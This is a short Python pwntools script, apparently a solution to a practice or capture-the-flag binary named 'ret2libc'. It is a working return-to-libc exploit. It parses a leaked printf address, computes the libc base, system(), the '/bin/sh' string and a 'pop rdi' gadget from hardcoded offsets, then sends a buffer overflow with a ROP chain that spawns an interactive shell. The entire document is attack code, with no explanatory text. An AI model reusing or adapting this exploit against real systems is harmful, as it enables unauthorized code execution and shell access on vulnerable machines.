from pwn import *
  
p = process('./ret2libc')
  
p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
  
libcBase = stackAddr - 0x64e80 # 0x55800
sysAddr = libcBase + 0x4f440 # 0x45390
binsh = libcBase + 0x1b3e9a # 0x18cd57
poprdi = libcBase + 0x2155f # 0x400763
  
print hex(libcBase)
print hex(sysAddr)
print hex(binsh)
print hex(poprdi)
  
exploit = "A" * 0x48 # (80 - len(p64(sysAddr)))
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(sysAddr)
 
p.send(exploit)
p.interactive()
